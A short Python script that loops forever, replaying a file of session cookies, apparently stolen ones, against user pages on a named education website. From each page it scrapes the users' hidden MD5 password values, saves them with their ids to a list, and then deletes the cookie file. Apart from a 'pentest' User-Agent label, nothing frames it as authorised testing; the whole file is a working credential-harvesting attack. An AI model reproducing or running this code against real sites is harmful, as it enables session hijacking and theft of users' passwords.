#import lib
from bs4 import BeautifulSoup
from time import sleep
import subprocess
import requests

#keep running the program until the end of time
while True:
	try:
		
		#try to open file less_cookies.txt
		#if doesn't exist, sleep for 5s
		less_cookies=open("less_cookies.txt","r").read()
		
		
		#extracting every single piece of cookies in file
		#making the cookies into dict
		for cookies in less_cookies.split("\n")[:-1]:
			cookiesdict={}
			for element in cookies.split(","):
				if "=" in element:
					key,values=element.split("=")
					cookiesdict[key]=values
				
							
			#get the main page by using the cookie dict
			main_page=BeautifulSoup(requests.get("http://www.alevel.com.cn/user/s3333/",cookies=cookiesdict,headers={'User-Agent':'pentest'}).content,"html.parser")
			
			
			#test if extract of password is successful
			#if unsuccessful, jump to the next piece of cookie
			try:
				passwd=main_page.find("input",attrs={"id":"md5_pass"})["value"]
			except:
				continue
				
			#extract the user id directly from the cookie dict
			names=cookiesdict["psid"]
			
			
			#writing the name and password into file
			namelist=open("namelist.txt","a")
			namelist.write(names+","+passwd+"\n")
			namelist.close()
			
		
		#delete the file less_cookeis
		subprocess.call("rm less_cookies.txt",shell=True)
	
	except:
		sleep(20)
	